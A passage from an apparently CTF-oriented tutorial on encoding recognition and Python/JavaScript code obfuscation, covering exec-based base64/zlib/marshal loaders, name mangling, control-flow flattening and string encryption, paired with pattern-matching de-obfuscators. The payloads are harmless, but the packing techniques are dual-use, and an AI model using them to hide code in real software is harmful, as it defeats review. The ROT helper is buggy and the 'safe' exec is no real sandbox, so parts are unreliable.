1. **Encoding Recognition:**
    
    - Base64: `=` padding, A-Za-z0-9+/
    - Hex: 0-9A-F, even length
    - URL: `%XX` format
    - Morse: dots and dashes
    - Bacon: 5-bit groups (AAAAA-BABBB)
2. **Multiple Layers:**
    
    - Always try recursive decoding
    - Common patterns: Base64 → Hex → Base64
    - Use automated tools for deep nesting
3. **Variants and Edge Cases:**
    
    - Base64 without padding
    - URL encoding with mixed case
    - Morse with different separators
    - Bacon steganography in text case
4. **Quick Decision Matrix:**
    
    - `=` at end → Base64/Base32
    - `%` symbols → URL encoding
    - Only hex chars → Hex/Base16
    - Dots/dashes → Morse code
    - Mixed case text → Possible Bacon steganography
5. **CTF-Specific Tips:**
    
    - Check for reversed encodings
    - Look for custom alphabets
    - Try both decode directions
    - Combine with cipher analysis if decoding fails

---

## Obfuscation Methods in CTF Exploitation

### Source Code Obfuscation

**Python Code Obfuscation Techniques**

```python
import base64
import zlib
import marshal
import ast

def obfuscate_python_basic(code):
    """
    Basic Python obfuscation using encoding layers
    
    [Inference: Simple obfuscation, easily reversible]
    """
    # Compile to bytecode
    compiled = compile(code, '<string>', 'exec')
    
    # Marshal and encode
    marshaled = marshal.dumps(compiled)
    compressed = zlib.compress(marshaled)
    encoded = base64.b64encode(compressed)
    
    obfuscated = f"""
import base64, zlib, marshal
exec(marshal.loads(zlib.decompress(base64.b64decode({encoded!r}))))
"""
    
    return obfuscated

# Example
original_code = """
password = "secret123"
if input("Enter password: ") == password:
    print("Access granted")
else:
    print("Access denied")
"""

obfuscated = obfuscate_python_basic(original_code)
print("=== Obfuscated Python Code ===")
print(obfuscated)
```

**Multi-Layer Obfuscation**

```python
def obfuscate_multilayer(code, layers=3):
    """
    Apply multiple layers of obfuscation
    Each layer adds base64 + zlib encoding
    """
    current = code
    
    for layer in range(layers):
        compressed = zlib.compress(current.encode())
        encoded = base64.b64encode(compressed)
        
        current = f"""
import base64, zlib
exec(zlib.decompress(base64.b64decode({encoded!r})).decode())
"""
    
    return current

# Example usage
simple_code = "print('Hello, World!')"
multi_obfuscated = obfuscate_multilayer(simple_code, layers=3)
print("=== Multi-Layer Obfuscated ===")
print(multi_obfuscated[:200] + "...")
```

**Lambda Obfuscation**

```python
def obfuscate_with_lambdas(code):
    """
    Obfuscate using lambda functions and functional programming
    
    [Inference: Makes code harder to read but doesn't hide logic completely]
    """
    # Convert simple operations to lambda expressions
    obfuscated = f"""
(lambda _exec, _code: _exec(_code))(
    (lambda: exec)(),
    {code!r}
)
"""
    return obfuscated

# Example
code = "print('Flag: CTF{example}')"
lambda_obfuscated = obfuscate_with_lambdas(code)
print("=== Lambda Obfuscated ===")
print(lambda_obfuscated)
```

**JavaScript Obfuscation**

```python
def obfuscate_javascript_basic(js_code):
    """
    Basic JavaScript obfuscation using various encoding techniques
    
    [Unverified: Example demonstrates concept; production obfuscators are more sophisticated]
    """
    import base64
    
    # Hex encoding
    hex_encoded = ''.join(f'\\x{ord(c):02x}' for c in js_code)
    
    obfuscated = f"""
eval(unescape('{hex_encoded}'))
"""
    
    # Alternative: Character code array
    char_codes = ','.join(str(ord(c)) for c in js_code)
    
    obfuscated_array = f"""
eval(String.fromCharCode({char_codes}))
"""
    
    return {
        'hex_encoding': obfuscated,
        'char_array': obfuscated_array
    }

# Example
js_code = "console.log('Secret flag: CTF{hidden}');"
js_obfuscated = obfuscate_javascript_basic(js_code)

print("=== JavaScript Hex Encoding ===")
print(js_obfuscated['hex_encoding'][:100] + "...")

print("\n=== JavaScript Char Array ===")
print(js_obfuscated['char_array'][:100] + "...")
```

**De-obfuscation Tools**

```python
def deobfuscate_python_basic(obfuscated_code):
    """
    Attempt to deobfuscate basic Python obfuscation
    
    [Inference: Works on simple base64/zlib patterns]
    """
    import re
    
    print("=== Attempting Deobfuscation ===\n")
    
    # Pattern 1: base64.b64decode pattern
    pattern1 = r"base64\.b64decode\((['\"])([^'\"]+)\1\)"
    matches = re.findall(pattern1, obfuscated_code)
    
    if matches:
        for quote, encoded in matches:
            try:
                decoded = base64.b64decode(encoded)
                print(f"Found base64 encoded data:")
                print(f"Decoded (raw): {decoded[:100]}...")
                
                # Try to decompress
                try:
                    decompressed = zlib.decompress(decoded)
                    print(f"Decompressed: {decompressed[:200]}...")
                    
                    # Try to unmarshal
                    try:
                        unmarshaled = marshal.loads(decompressed)
                        print(f"Type after unmarshal: {type(unmarshaled)}")
                    except:
                        pass
                except:
                    pass
                    
            except Exception as e:
                print(f"Error decoding: {e}")
    
    # Pattern 2: exec with string
    pattern2 = r"exec\(['\"](.+?)['\"]\)"
    exec_matches = re.findall(pattern2, obfuscated_code)
    
    if exec_matches:
        print(f"\nFound exec statements: {len(exec_matches)}")
        for match in exec_matches[:3]:
            print(f"  {match[:50]}...")

# Test deobfuscation
code = "print('Hidden message')"
obf = obfuscate_python_basic(code)
deobfuscate_python_basic(obf)
```

### Variable Name Mangling

**Identifier Mangling**

```python
import random
import string
import re

def generate_mangled_name(index, style='hex'):
    """
    Generate obfuscated variable names
    """
    if style == 'hex':
        return f"_{hex(index)[2:].upper()}"
    elif style == 'random':
        length = random.randint(10, 20)
        chars = string.ascii_lowercase + '_'
        return ''.join(random.choice(chars) for _ in range(length))
    elif style == 'unicode':
        # Use zero-width characters (invisible)
        invisible = ['\u200b', '\u200c', '\u200d', '\u2060']
        return 'var' + ''.join(random.choice(invisible) for _ in range(5))
    elif style == 'confusing':
        # Use similar-looking characters
        return random.choice(['l1l1l', 'O0O0O', 'rn_m', 'vv_w'])
    else:
        return f"var_{index}"

def mangle_variable_names(code):
    """
    Replace all variable names with mangled versions
    
    [Inference: Preserves functionality while reducing readability]
    """
    # Parse code to AST
    try:
        tree = ast.parse(code)
    except SyntaxError:
        return None
    
    # Collect all names
    names = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.Name):
            names.add(node.id)
        elif isinstance(node, ast.FunctionDef):
            names.add(node.name)
    
    # Filter out built-ins and keywords
    import keyword
    builtins_list = dir(__builtins__)
    names = {n for n in names if n not in keyword.kwlist and n not in builtins_list}
    
    # Create mapping
    name_mapping = {}
    for i, name in enumerate(sorted(names)):
        name_mapping[name] = generate_mangled_name(i, style='hex')
    
    # Replace in code
    mangled_code = code
    for old_name, new_name in sorted(name_mapping.items(), key=lambda x: len(x[0]), reverse=True):
        # Use word boundaries to avoid partial replacements
        mangled_code = re.sub(r'\b' + re.escape(old_name) + r'\b', new_name, mangled_code)
    
    return {
        'code': mangled_code,
        'mapping': name_mapping
    }

# Example usage
original = """
def check_password(user_input):
    secret_password = "CTF{flag_here}"
    if user_input == secret_password:
        return True
    return False

user_guess = input("Enter password: ")
result = check_password(user_guess)
print(result)
"""

mangled = mangle_variable_names(original)
if mangled:
    print("=== Original Code ===")
    print(original)
    print("\n=== Mangled Code ===")
    print(mangled['code'])
    print("\n=== Name Mapping ===")
    for old, new in mangled['mapping'].items():
        print(f"  {old:20} -> {new}")
```

**Advanced Variable Mangling**

```python
def mangle_with_encoding(code):
    """
    Mangle variables and encode their values
    """
    mangled = mangle_variable_names(code)
    if not mangled:
        return None
    
    mangled_code = mangled['code']
    
    # Further obfuscate string literals
    def encode_string(s):
        # Convert to hex array
        hex_array = ','.join(f"0x{ord(c):02x}" for c in s)
        return f"''.join(chr(c) for c in [{hex_array}])"
    
    # Find string literals
    string_pattern = r"(['\"])([^'\"]+)\1"
    
    def replace_string(match):
        quote = match.group(1)
        content = match.group(2)
        if len(content) > 3:  # Only encode longer strings
            return encode_string(content)
        return match.group(0)
    
    encoded_code = re.sub(string_pattern, replace_string, mangled_code)
    
    return encoded_code

# Example
code = """
password = "secret123"
flag = "CTF{example_flag}"
"""

encoded = mangle_with_encoding(code)
if encoded:
    print("=== Heavily Mangled Code ===")
    print(encoded)
```

**De-mangling Techniques**

```python
def analyze_mangled_code(code):
    """
    Analyze obfuscated code to identify patterns
    
    [Inference: Helps understand obfuscation technique used]
    """
    print("=== Code Analysis ===\n")
    
    # Count variable types
    hex_vars = len(re.findall(r'\b_[0-9A-F]+\b', code))
    long_vars = len(re.findall(r'\b[a-z_]{15,}\b', code))
    confusing_vars = len(re.findall(r'\b[l1O0rn_m]+\b', code))
    
    print(f"Hex-style variables: {hex_vars}")
    print(f"Long random variables: {long_vars}")
    print(f"Confusing variables: {confusing_vars}")
    
    # Detect encoding patterns
    if 'base64.b64decode' in code:
        print("\n[Detection] Base64 encoding used")
    if 'zlib.decompress' in code:
        print("[Detection] Zlib compression used")
    if 'marshal.loads' in code:
        print("[Detection] Marshal serialization used")
    if 'exec(' in code or 'eval(' in code:
        print("[Detection] Dynamic execution used")
    
    # String encoding detection
    if 'chr(' in code and '[' in code:
        print("[Detection] Character array encoding detected")
        
    # Extract potential encoded data
    base64_pattern = r"b64decode\(['\"]([A-Za-z0-9+/=]+)['\"]\)"
    encoded_data = re.findall(base64_pattern, code)
    
    if encoded_data:
        print(f"\n[Found] {len(encoded_data)} base64 encoded blocks")
        for i, data in enumerate(encoded_data[:3], 1):
            print(f"  Block {i}: {data[:50]}...")

# Test
obf_code = obfuscate_python_basic("password = 'secret'")
analyze_mangled_code(obf_code)
```

### Control Flow Obfuscation

**Opaque Predicates**

```python
def add_opaque_predicates(code):
    """
    Add opaque predicates - conditions that always evaluate to True/False
    but are hard to analyze statically
    
    [Inference: Increases complexity without changing functionality]
    """
    # Examples of opaque predicates
    opaque_true = [
        "(lambda x: x*x >= 0)(5)",  # Always True
        "(2**10 == 1024)",
        "(len('test') == 4)",
        "((lambda: True)())",
    ]
    
    opaque_false = [
        "(lambda x: x != x)(42)",  # Always False
        "(5 < 3)",
        "('' == 'x')",
    ]
    
    lines = code.split('\n')
    obfuscated_lines = []
    
    for line in lines:
        # Add random opaque predicate before some lines
        if line.strip() and not line.strip().startswith('#') and random.random() < 0.3:
            predicate = random.choice(opaque_true)
            obfuscated_lines.append(f"if {predicate}:")
            obfuscated_lines.append(f"    {line}")
        else:
            obfuscated_lines.append(line)
    
    return '\n'.join(obfuscated_lines)

# Example
simple_code = """
x = 10
y = 20
print(x + y)
"""

with_predicates = add_opaque_predicates(simple_code)
print("=== Code with Opaque Predicates ===")
print(with_predicates)
```

**Control Flow Flattening**

```python
def flatten_control_flow(code):
    """
    Convert linear code into switch-case based control flow
    
    [Inference: Makes static analysis more difficult by obscuring execution order]
    """
    lines = [l.strip() for l in code.split('\n') if l.strip() and not l.startswith('#')]
    
    # Create dispatcher-based control flow
    flattened = """
_state = 0
while True:
"""
    
    for i, line in enumerate(lines):
        flattened += f"""    if _state == {i}:
        {line}
        _state = {i + 1}
"""
    
    flattened += f"""    elif _state == {len(lines)}:
        break
"""
    
    return flattened

# Example
linear_code = """
password = input("Enter password: ")
correct = "secret123"
if password == correct:
    print("Access granted")
else:
    print("Access denied")
"""

flattened = flatten_control_flow(linear_code)
print("=== Flattened Control Flow ===")
print(flattened)
```

**Jump Table Obfuscation**

```python
def create_jump_table_obfuscation(statements):
    """
    Create a jump table to obfuscate execution order
    
    Args:
        statements: list of code statements
    
    [Inference: Execution order determined at runtime through table lookup]
    """
    import random
    
    # Create random execution order
    num_statements = len(statements)
    order = list(range(num_statements))
    random.shuffle(order)
    
    # Create jump table
    jump_table = {}
    for i in range(num_statements):
        current_idx = order[i]
        next_idx = order[i + 1] if i + 1 < num_statements else -1
        jump_table[current_idx] = (statements[current_idx], next_idx)
    
    # Generate obfuscated code
    code = f"""
_jump_table = {jump_table!r}
_current = {order[0]}

while _current != -1:
    _stmt, _next = _jump_table[_current]
    exec(_stmt)
    _current = _next
"""
    
    return code

# Example
statements = [
    "x = 10",
    "y = 20",
    "z = x + y",
    "print(f'Result: {z}')"
]

jump_obfuscated = create_jump_table_obfuscation(statements)
print("=== Jump Table Obfuscated ===")
print(jump_obfuscated)
```

**Exception-Based Control Flow**

```python
def obfuscate_with_exceptions(code):
    """
    Use exception handling for control flow obfuscation
    
    [Inference: Unconventional control flow pattern]
    """
    lines = [l.strip() for l in code.split('\n') if l.strip()]
    
    obfuscated = """
class _FlowControl(Exception):
    def __init__(self, next_step):
        self.next_step = next_step

_step = 0
while _step >= 0:
    try:
"""
    
    for i, line in enumerate(lines):
        obfuscated += f"""        if _step == {i}:
            {line}
            raise _FlowControl({i + 1})
"""
    
    obfuscated += f"""        if _step >= {len(lines)}:
            raise _FlowControl(-1)
    except _FlowControl as e:
        _step = e.next_step
"""
    
    return obfuscated

# Example
code = """
a = 5
b = 10
c = a * b
print(c)
"""

exception_obfuscated = obfuscate_with_exceptions(code)
print("=== Exception-Based Control Flow ===")
print(exception_obfuscated)
```

**De-obfuscating Control Flow**

```python
def analyze_control_flow(code):
    """
    Analyze and attempt to reconstruct original control flow
    
    [Inference: Identifies obfuscation patterns]
    """
    print("=== Control Flow Analysis ===\n")
    
    # Detect state machines
    if '_state' in code and 'while' in code:
        print("[Detection] State machine pattern detected")
        
        # Extract states
        state_pattern = r'if _state == (\d+):'
        states = re.findall(state_pattern, code)
        print(f"  Found {len(states)} states")
    
    # Detect jump tables
    if '_jump_table' in code:
        print("[Detection] Jump table pattern detected")
        
        # Try to extract jump table
        table_pattern = r'_jump_table = ({.*?})'
        match = re.search(table_pattern, code, re.DOTALL)
        if match:
            try:
                jump_table = eval(match.group(1))
                print(f"  Jump table entries: {len(jump_table)}")
                
                # Reconstruct order
                print("\n  Reconstructed execution order:")
                current = 0
                visited = set()
                step = 0
                
                while current != -1 and current not in visited:
                    if current in jump_table:
                        stmt, next_idx = jump_table[current]
                        print(f"    Step {step}: {stmt}")
                        visited.add(current)
                        current = next_idx
                        step += 1
                    else:
                        break
            except:
                print("  Could not parse jump table")
    
    # Detect exception-based control flow
    if 'class _FlowControl(Exception)' in code:
        print("[Detection] Exception-based control flow detected")
    
    # Detect opaque predicates
    opaque_patterns = [
        r'\(lambda x: x\*x >= 0\)',
        r'\(2\*\*10 == 1024\)',
        r'\(lambda x: x != x\)',
    ]
    
    opaque_count = sum(len(re.findall(pattern, code)) for pattern in opaque_patterns)
    if opaque_count > 0:
        print(f"[Detection] {opaque_count} opaque predicates detected")

# Test
obf = flatten_control_flow("x=1\ny=2\nprint(x+y)")
analyze_control_flow(obf)
```

### String Obfuscation

**XOR String Encoding**

```python
def xor_encode_string(plaintext, key=0x42):
    """
    XOR encode a string with a single-byte key
    """
    encoded = bytes([b ^ key for b in plaintext.encode()])
    return encoded

def xor_decode_string(encoded, key=0x42):
    """
    XOR decode a string
    """
    decoded = bytes([b ^ key for b in encoded])
    return decoded.decode()

def obfuscate_strings_xor(code, key=0x42):
    """
    Replace all string literals with XOR-encoded versions
    """
    def replace_string(match):
        quote = match.group(1)
        content = match.group(2)
        
        # Encode string
        encoded = xor_encode_string(content, key)
        hex_encoded = encoded.hex()
        
        # Generate decoder
        return f"bytes.fromhex('{hex_encoded}').decode('latin1').translate(str.maketrans({{chr(i):chr(i^{key}) for i in range(256)}}))"
    
    # More accurate replacement
    obfuscated = code
    string_pattern = r"(['\"])([^'\"\\]*(?:\\.[^'\"\\]*)*)\1"
    
    matches = list(re.finditer(string_pattern, code))
    offset = 0
    
    for match in matches:
        quote = match.group(1)
        content = match.group(2)
        
        if len(content) > 2:  # Only obfuscate longer strings
            encoded = xor_encode_string(content, key)
            replacement = f"''.join(chr(c^{key}) for c in bytes.fromhex('{encoded.hex()}'))"
            
            start = match.start() + offset
            end = match.end() + offset
            obfuscated = obfuscated[:start] + replacement + obfuscated[end:]
            offset += len(replacement) - (end - start)
    
    return obfuscated

# Example
code_with_strings = """
password = "secret123"
flag = "CTF{hidden_flag}"
print(f"The password is {password}")
"""

xor_obfuscated = obfuscate_strings_xor(code_with_strings, key=0x55)
print("=== XOR String Obfuscation ===")
print(xor_obfuscated)
```

**Base64 String Encoding**

```python
def obfuscate_strings_base64(code):
    """
    Encode all strings using base64
    """
    def replace_string(match):
        quote = match.group(1)
        content = match.group(2)
        
        if len(content) > 2:
            encoded = base64.b64encode(content.encode()).decode()
            return f"__import__('base64').b64decode('{encoded}').decode()"
        return match.group(0)
    
    string_pattern = r"(['\"])([^'\"]+)\1"
    obfuscated = re.sub(string_pattern, replace_string, code)
    
    return obfuscated

# Example
print("\n=== Base64 String Obfuscation ===")
print(obfuscate_strings_base64(code_with_strings))
```

**ROT13/Caesar Cipher String Encoding**

```python
def rot_encode(text, shift=13):
    """
    ROT-N encoding for strings
    """
    result = []
    for char in text:
        if char.isalpha():
            base = ord('A') if char.isupper() else ord('a')
            result.append(chr((ord(char) - base + shift) % 26 + base))
        else:
            result.append(char)
    return ''.join(result)

def obfuscate_strings_rot(code, shift=13):
    """
    Encode strings using ROT-N cipher
    """
    def replace_string(match):
        quote = match.group(1)
        content = match.group(2)
        
        if len(content) > 2 and content.isalpha():
            encoded = rot_encode(content, shift)
            # Generate inline decoder
            decoder = f"''.join(chr((ord(c)-({'65' if 'c.isupper()' else '97'})+{26-shift})%26+({'65' if 'c.isupper()' else '97'})) if c.isalpha() else c for c in '{encoded}')"
            return decoder
        return match.group(0)
    
    string_pattern = r"(['\"])([^'\"]+)\1"
    obfuscated = re.sub(string_pattern, replace_string, code)
    
    return obfuscated

# Example
print("\n=== ROT13 String Obfuscation ===")
simple_code = "password = 'SECRET'"
print(obfuscate_strings_rot(simple_code))
```

**Character Code Array Encoding**

```python
def obfuscate_strings_charcode(code):
    """
    Replace strings with character code arrays
    """
    def replace_string(match):
        quote = match.group(1)
        content = match.group(2)
        
        if len(content) > 2:
            char_codes = ','.join(str(ord(c)) for c in content)
            return f"''.join(chr(c) for c in [{char_codes}])"
        return match.group(0)
    
    string_pattern = r"(['\"])([^'\"]+)\1"
    obfuscated = re.sub(string_pattern, replace_string, code)
    
    return obfuscated

# Example
print("\n=== Character Code Array Obfuscation ===")
print(obfuscate_strings_charcode(code_with_strings))
```

**Multi-Layer String Obfuscation**

```python
def obfuscate_strings_multilayer(code, layers=['xor', 'base64', 'reverse']):
    """
    Apply multiple layers of string obfuscation
    
    [Inference: Each layer increases deobfuscation complexity]
    """
    current = code
    
    for layer in layers:
        if layer == 'xor':
            current = obfuscate_strings_xor(current, key=random.randint(1, 255))
        elif layer == 'base64':
            current = obfuscate_strings_base64(current)
        elif layer == 'reverse':
            # Reverse string encoding
            def reverse_replace(match):
                content = match.group(2)
                if len(content) > 2:
                    reversed_str = content[::-1]
                    return f"'{reversed_str}'[::-1]"
                return match.group(0)
            
            pattern = r"(['\"])([^'\"]+)\1"
            current = re.sub(pattern, reverse_replace, current)
        elif layer == 'hex':
            def hex_replace(match):
                content = match.group(2)
                if len(content) > 2:
                    hex_str = content.encode().hex()
                    return f"bytes.fromhex('{hex_str}').decode()"
                return match.group(0)
            
            pattern = r"(['\"])([^'\"]+)\1"
            current = re.sub(pattern, hex_replace, current)
    
    return current

# Example
print("\n=== Multi-Layer String Obfuscation ===")
multi_obf = obfuscate_strings_multilayer("flag = 'CTF{example}'", layers=['reverse', 'hex'])
print(multi_obf)
```

**String De-obfuscation Framework**

```python
def deobfuscate_strings(code):
    """
    Attempt to deobfuscate various string encoding methods
    
    [Inference: Pattern matching for common obfuscation techniques]
    """
    print("=== String Deobfuscation Analysis ===\n")
    
    findings = []
    
    # Detect base64 encoded strings
    base64_pattern = r"base64\.b64decode\(['\"]([A-Za-z0-9+/=]+)['\"]\)"
    base64_matches = re.findall(base64_pattern, code)
    
    if base64_matches:
        print(f"[Found] {len(base64_matches)} base64 encoded strings:")
        for encoded in base64_matches[:5]:
            try:
                decoded = base64.b64decode(encoded).decode()
                print(f"  '{encoded[:30]}...' -> '{decoded}'")
                findings.append(decoded)
            except:
                print(f"  '{encoded[:30]}...' -> [decode error]")
    
    # Detect hex encoded strings
    hex_pattern = r"bytes\.fromhex\(['\"]([0-9a-fA-F]+)['\"]\)"
    hex_matches = re.findall(hex_pattern, code)
    
    if hex_matches:
        print(f"\n[Found] {len(hex_matches)} hex encoded strings:")
        for encoded in hex_matches[:5]:
            try:
                decoded = bytes.fromhex(encoded).decode()
                print(f"  '{encoded[:30]}...' -> '{decoded}'")
                findings.append(decoded)
            except:
                print(f"  '{encoded[:30]}...' -> [decode error]")
    
    # Detect XOR patterns
    xor_pattern = r"chr\(c\^(\d+)\)"
    xor_matches = re.findall(xor_pattern, code)
    
    if xor_matches:
        print(f"\n[Found] XOR encoding with keys: {set(xor_matches)}")
    
    # Detect character arrays
    chararray_pattern = r"\[(\d+(?:,\d+)+)\]"
    chararray_matches = re.findall(chararray_pattern, code)
    
    if chararray_matches:
        print(f"\n[Found] {len(chararray_matches)} character arrays:")
        for arr_str in chararray_matches[:3]:
            try:
                char_codes = [int(x) for x in arr_str.split(',')]
                if all(32 <= c <= 126 for c in char_codes):  # Printable ASCII
                    decoded = ''.join(chr(c) for c in char_codes)
                    print(f"  [{arr_str[:50]}...] -> '{decoded}'")
                    findings.append(decoded)
            except:
                pass
    
    # Detect reversed strings
    if "[::-1]" in code:
        print("\n[Found] String reversal detected")
    
    print(f"\n=== Summary ===")
    print(f"Total decoded strings: {len(findings)}")
    
    # Check for flags
    flag_pattern = r'CTF\{[^}]+\}'
    flags = [f for f in findings if re.search(flag_pattern, f)]
    
    if flags:
        print(f"\n[!!!] FOUND FLAGS: {len(flags)}")
        for flag in flags:
            print(f"  {flag}")
    
    return findings

# Test deobfuscation
test_obfuscated = """
s1 = __import__('base64').b64decode('Q1RGe2V4YW1wbGVfZmxhZ30=').decode()
s2 = bytes.fromhex('7365637265745f706173737764').decode()
s3 = ''.join(chr(c) for c in [72,101,108,108,111])
s4 = 'gnalf'[::-1]
"""

deobfuscate_strings(test_obfuscated)
```

**String Encryption with Key**

```python
def encrypt_string_aes(plaintext, key):
    """
    Encrypt string using AES (for demonstration)
    
    [Inference: Stronger than simple encoding, requires key recovery]
    """
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
    import hashlib
    
    # Derive key from password
    key_bytes = hashlib.sha256(key.encode()).digest()[:16]
    
    # Encrypt
    cipher = AES.new(key_bytes, AES.MODE_ECB)
    padded = pad(plaintext.encode(), AES.block_size)
    encrypted = cipher.encrypt(padded)
    
    return encrypted

def obfuscate_strings_encrypted(code, encryption_key="secret"):
    """
    Replace strings with AES-encrypted versions
    
    [Unverified: Requires pycryptodome; example demonstrates concept]
    """
    def replace_string(match):
        quote = match.group(1)
        content = match.group(2)
        
        if len(content) > 2:
            try:
                encrypted = encrypt_string_aes(content, encryption_key)
                hex_encrypted = encrypted.hex()
                
                # Generate decryption code
                decrypt_code = f"""
(lambda: __import__('Crypto.Cipher.AES').AES.new(
    __import__('hashlib').sha256('{encryption_key}'.encode()).digest()[:16],
    __import__('Crypto.Cipher.AES').MODE_ECB
).decrypt(bytes.fromhex('{hex_encrypted}')))()
"""
                return decrypt_code.strip()
            except ImportError:
                return match.group(0)
        return match.group(0)
    
    string_pattern = r"(['\"])([^'\"]+)\1"
    obfuscated = re.sub(string_pattern, replace_string, code)
    
    return obfuscated

# Example (will work if pycryptodome is installed)
print("\n=== AES String Obfuscation ===")
try:
    encrypted_code = obfuscate_strings_encrypted("password = 'secret123'", "mykey")
    print(encrypted_code[:200] + "...")
except Exception as e:
    print(f"[Note] Requires pycryptodome: {e}")
```

**Dynamic String Construction**

```python
def obfuscate_strings_dynamic(code):
    """
    Replace strings with dynamic construction expressions
    Makes static analysis harder
    """
    def replace_string(match):
        content = match.group(2)
        
        if len(content) > 3:
            # Split into chunks and concatenate
            chunks = [content[i:i+2] for i in range(0, len(content), 2)]
            concatenated = " + ".join(f"'{chunk}'" for chunk in chunks)
            
            # Add random operations that don't change result
            operations = [
                f"({concatenated})",
                f"(''.join([{', '.join(repr(c) for c in content)}]))",
                f"('{content[0]}' + ''.join([{', '.join(repr(c) for c in content[1:])}]))",
            ]
            
            return random.choice(operations)
        
        return match.group(0)
    
    string_pattern = r"(['\"])([^'\"]+)\1"
    obfuscated = re.sub(string_pattern, replace_string, code)
    
    return obfuscated

# Example
print("\n=== Dynamic String Construction ===")
print(obfuscate_strings_dynamic("flag = 'CTF{example}'"))
```

### Complete Obfuscation Framework

```python
class CodeObfuscator:
    """
    Comprehensive code obfuscator combining multiple techniques
    """
    
    def __init__(self, code):
        self.original_code = code
        self.obfuscated_code = code
        self.applied_techniques = []
    
    def apply_variable_mangling(self):
        """Apply variable name mangling"""
        result = mangle_variable_names(self.obfuscated_code)
        if result:
            self.obfuscated_code = result['code']
            self.applied_techniques.append('variable_mangling')
        return self
    
    def apply_string_obfuscation(self, method='xor'):
        """Apply string obfuscation"""
        if method == 'xor':
            self.obfuscated_code = obfuscate_strings_xor(self.obfuscated_code)
        elif method == 'base64':
            self.obfuscated_code = obfuscate_strings_base64(self.obfuscated_code)
        elif method == 'charcode':
            self.obfuscated_code = obfuscate_strings_charcode(self.obfuscated_code)
        elif method == 'dynamic':
            self.obfuscated_code = obfuscate_strings_dynamic(self.obfuscated_code)
        
        self.applied_techniques.append(f'string_obfuscation_{method}')
        return self
    
    def apply_control_flow_obfuscation(self, method='flatten'):
        """Apply control flow obfuscation"""
        if method == 'flatten':
            self.obfuscated_code = flatten_control_flow(self.obfuscated_code)
        elif method == 'opaque':
            self.obfuscated_code = add_opaque_predicates(self.obfuscated_code)
        elif method == 'exceptions':
            self.obfuscated_code = obfuscate_with_exceptions(self.obfuscated_code)
        
        self.applied_techniques.append(f'control_flow_{method}')
        return self
    
    def apply_encoding(self, layers=1):
        """Apply base64/zlib encoding layers"""
        for _ in range(layers):
            self.obfuscated_code = obfuscate_python_basic(self.obfuscated_code)
        
        self.applied_techniques.append(f'encoding_{layers}_layers')
        return self
    
    def get_result(self):
        """Get final obfuscated code"""
        return {
            'code': self.obfuscated_code,
            'techniques': self.applied_techniques,
            'original_length': len(self.original_code),
            'obfuscated_length': len(self.obfuscated_code),
            'size_increase': f"{(len(self.obfuscated_code) / len(self.original_code) - 1) * 100:.1f}%"
        }
    
    def save(self, filename):
        """Save obfuscated code to file"""
        with open(filename, 'w') as f:
            f.write(self.obfuscated_code)
        print(f"[+] Saved obfuscated code to {filename}")

# Example usage
original_code = """
def check_flag(user_input):
    correct_flag = "CTF{example_flag_12345}"
    if user_input == correct_flag:
        print("Correct!")
        return True
    else:
        print("Wrong!")
        return False

user_guess = input("Enter flag: ")
result = check_flag(user_guess)
"""

print("=== Complete Obfuscation Pipeline ===\n")
print("Original code:")
print(original_code)
print("\n" + "="*60 + "\n")

# Apply multiple obfuscation techniques
obfuscator = CodeObfuscator(original_code)
result = (obfuscator
    .apply_variable_mangling()
    .apply_string_obfuscation('xor')
    .apply_control_flow_obfuscation('opaque')
    .apply_encoding(layers=1)
    .get_result())

print("Obfuscated code:")
print(result['code'][:500] + "...")
print(f"\nApplied techniques: {', '.join(result['techniques'])}")
print(f"Size increase: {result['size_increase']}")
```

### De-obfuscation Tools and Techniques

**Automated De-obfuscator**

```python
class CodeDeobfuscator:
    """
    Automated deobfuscation tool
    
    [Inference: Uses pattern matching and heuristics]
    """
    
    def __init__(self, obfuscated_code):
        self.code = obfuscated_code
        self.findings = []
        self.decoded_strings = []
    
    def detect_obfuscation_type(self):
        """Detect which obfuscation techniques were used"""
        techniques = []
        
        if 'base64.b64decode' in self.code:
            techniques.append('base64_encoding')
        if 'zlib.decompress' in self.code:
            techniques.append('zlib_compression')
        if 'marshal.loads' in self.code:
            techniques.append('marshal_serialization')
        if '_state' in self.code and 'while' in self.code:
            techniques.append('control_flow_flattening')
        if '_jump_table' in self.code:
            techniques.append('jump_table')
        if 'chr(c^' in self.code:
            techniques.append('xor_encoding')
        if re.search(r'_[0-9A-F]+', self.code):
            techniques.append('variable_mangling')
        
        return techniques
    
    def extract_encoded_data(self):
        """Extract all encoded data"""
        
        # Base64 encoded data
        base64_pattern = r"b64decode\(['\"]([A-Za-z0-9+/=]+)['\"]\)"
        for match in re.finditer(base64_pattern, self.code):
            encoded = match.group(1)
            try:
                decoded = base64.b64decode(encoded)
                self.findings.append({
                    'type': 'base64',
                    'encoded': encoded[:50],
                    'decoded': decoded[:100]
                })
            except:
                pass
        
        # Hex encoded data
        hex_pattern = r"fromhex\(['\"]([0-9a-fA-F]+)['\"]\)"
        for match in re.finditer(hex_pattern, self.code):
            encoded = match.group(1)
            try:
                decoded = bytes.fromhex(encoded)
                self.findings.append({
                    'type': 'hex',
                    'encoded': encoded[:50],
                    'decoded': decoded[:100]
                })
            except:
                pass
        
        # Character arrays
        array_pattern = r"chr\(c\) for c in \[([0-9, ]+)\]"
        for match in re.finditer(array_pattern, self.code):
            arr_str = match.group(1)
            try:
                chars = [int(x) for x in arr_str.split(',')]
                decoded = ''.join(chr(c) for c in chars if 32 <= c <= 126)
                self.findings.append({
                    'type': 'char_array',
                    'encoded': arr_str[:50],
                    'decoded': decoded
                })
            except:
                pass
        
        return self.findings
    
    def try_execute_safe(self, code_snippet, timeout=5):
        """
        Safely execute code snippet to extract strings
        
        [WARNING: This can be dangerous. Only use on trusted/sandboxed code]
        [Inference: Dynamic analysis through controlled execution]
        """
        import io
        import sys
        
        # Redirect stdout
        old_stdout = sys.stdout
        sys.stdout = captured_output = io.StringIO()
        
        try:
            # Execute in restricted namespace
            namespace = {
                '__builtins__': {
                    'chr': chr,
                    'ord': ord,
                    'bytes': bytes,
                    'str': str,
                }
            }
            exec(code_snippet, namespace)
            output = captured_output.getvalue()
            return output
        except Exception as e:
            return f"[Error: {e}]"
        finally:
            sys.stdout = old_stdout
    
    def reconstruct_strings(self):
        """Attempt to reconstruct original strings"""
        reconstructed = []
        
        for finding in self.findings:
            if finding['type'] in ['base64', 'hex', 'char_array']:
                try:
                    decoded = finding['decoded']
                    if isinstance(decoded, bytes):
                        decoded = decoded.decode('utf-8', errors='ignore')
                    reconstructed.append(decoded)
                except:
                    pass
